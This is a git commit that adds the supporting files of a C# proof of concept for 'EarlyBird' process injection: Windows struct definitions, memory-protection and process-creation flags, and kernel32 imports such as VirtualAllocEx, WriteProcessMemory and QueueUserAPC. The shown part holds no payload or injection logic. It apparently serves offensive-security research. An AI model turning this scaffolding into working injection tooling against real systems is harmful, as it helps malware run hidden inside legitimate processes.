0bd03840dcdf58a5a4bd7010527012f13a19faa6
dosxuz <ritabandas2000@gmail.com>
2022-01-01 20:28:48 +0530

    Added the EarlyBird Process Injection POC

---
+++ EarlyBird/EarlyBird/DataTypes.cs
@@ -0,0 +1,107 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.Runtime.InteropServices;
+
+namespace EarlyBird
+{
+    class DataTypes
+    {
+		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+		internal struct STARTUPINFO
+		{
+			public Int32 cb;
+			public string lpReserved;
+			public string lpDesktop;
+			public string lpTitle;
+			public Int32 dwX;
+			public Int32 dwY;
+			public Int32 dwXSize;
+			public Int32 dwYSize;
+			public Int32 dwXCountChars;
+			public Int32 dwYCountChars;
+			public Int32 dwFillAttribute;
+			public Int32 dwFlags;
+			public Int16 wShowWindow;
+			public Int16 cbReserved2;
+			public IntPtr lpReserved2;
+			public IntPtr hStdInput;
+			public IntPtr hStdOutput;
+			public IntPtr hStdError;
+		}
+
+		[StructLayout(LayoutKind.Sequential)]
+		internal struct PROCESS_INFORMATION
+		{
+			public IntPtr hProcess;
+			public IntPtr hThread;
+			public int dwProcessId;
+			public int dwThreadId;
+		}
+
+
+		[StructLayout(LayoutKind.Sequential)]
+		internal struct PROCESS_BASIC_INFORMATION
+		{
+			public IntPtr Reserved1;
+			public IntPtr PebAddress;
+			public IntPtr Reserved2;
+			public IntPtr Reserved3;
+			public IntPtr UniquePid;
+			public IntPtr MoreReserved;
+		}
+
+		public enum AllocationType : uint
+		{
+			Commit = 0x1000,
+			Reserve = 0x2000,
+			Decommit = 0x4000,
+			Release = 0x8000,
+			Reset = 0x80000,
+			Physical = 0x400000,
+			TopDown = 0x100000,
+			WriteWatch = 0x200000,
+			LargePages = 0x20000000
+		}
+
+		[Flags]
+		public enum MemoryProtection : uint
+		{
+			Execute = 0x10,
+			ExecuteRead = 0x20,
+			ExecuteReadWrite = 0x40,
+			ExecuteWriteCopy = 0x80,
+			NoAccess = 0x01,
+			ReadOnly = 0x02,
+			ReadWrite = 0x04,
+			WriteCopy = 0x08,
+			GuardModifierflag = 0x100,
+			NoCacheModifierflag = 0x200,
+			WriteCombineModifierflag = 0x400
+		}
+
+		[Flags]
+		public enum dwCreationFlags : uint
+        {
+			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+			CREATE_NEW_CONSOLE = 0x00000010,
+			CREATE_NEW_PROCESS_GROUP = 0x00000200,
+			CREATE_NO_WINDOW = 0x08000000,
+			CREATE_PROTECTED_PROCESS = 0x00040000,
+			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+			CREATE_SEPARATE_WOW_VDM = 0x00000800,
+			CREATE_SHARED_WOW_VDM = 0x00001000,
+			CREATE_SUSPENDED = 0x00000004,
+			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+			DEBUG_PROCESS = 0x00000001,
+			DETACHED_PROCESS = 0x00000008,
+			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+			INHERIT_PARENT_AFFINITY = 0x00010000
+		}
+	}
+}
---
+++ EarlyBird/EarlyBird/FunctionImports.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.Runtime.InteropServices;
+
+using static EarlyBird.DataTypes;
+using static EarlyBird.Program;
+
+
+namespace EarlyBird
+{
+    class FunctionImports
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern Int32 GetLastError();
+
+        [DllImport("kernel32.dll")]
+        public static extern void SetLastError(uint dwErrorCode);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
+        public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hHandle);
+    }
+}
